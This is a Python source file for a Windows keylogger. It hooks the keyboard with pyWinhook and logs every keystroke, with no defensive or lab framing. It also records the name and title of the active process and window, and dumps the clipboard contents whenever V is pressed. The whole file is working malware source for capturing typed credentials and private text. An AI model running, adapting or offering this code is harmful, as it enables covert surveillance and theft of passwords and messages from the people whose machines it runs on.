import ctypes
import pythoncom
import pyWinhook  # Python 3 fork of pyHook
import win32clipboard

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
psapi = ctypes.windll.psapi

current_window = None


def get_current_process():
    # Get handle to foreground window
    hwnd = user32.GetForegroundWindow()

    # Get PID
    pid = ctypes.c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))

    # Open process
    h_process = kernel32.OpenProcess(0x0400 | 0x0010, False, pid.value)

    # Get executable name
    executable = ctypes.create_string_buffer(512)
    psapi.GetModuleBaseNameA(h_process, None, executable, 512)

    # Get window title
    window_title = ctypes.create_string_buffer(512)
    user32.GetWindowTextA(hwnd, window_title, 512)

    print("\n[ PID: {} - {} - {} ]".format(
        pid.value,
        executable.value.decode(errors='ignore'),
        window_title.value.decode(errors='ignore')
    ))

    # Clean up
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def keystroke_handler(event):
    global current_window

    # Detect new window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # Print ASCII characters
    if 32 < event.Ascii < 127:
        print(chr(event.Ascii), end='', flush=True)
    else:
        # Handle clipboard paste
        if event.Key == "V":
            try:
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print("[PASTE] - {}".format(pasted_value), end='', flush=True)
            except Exception:
                pass
        else:
            print("[{}]".format(event.Key), end='', flush=True)

    return True


def run_keylogger():
    hook_manager = pyWinhook.HookManager()
    hook_manager.KeyDown = keystroke_handler
    hook_manager.HookKeyboard()
    pythoncom.PumpMessages()


if __name__ == '__main__':
    run_keylogger()
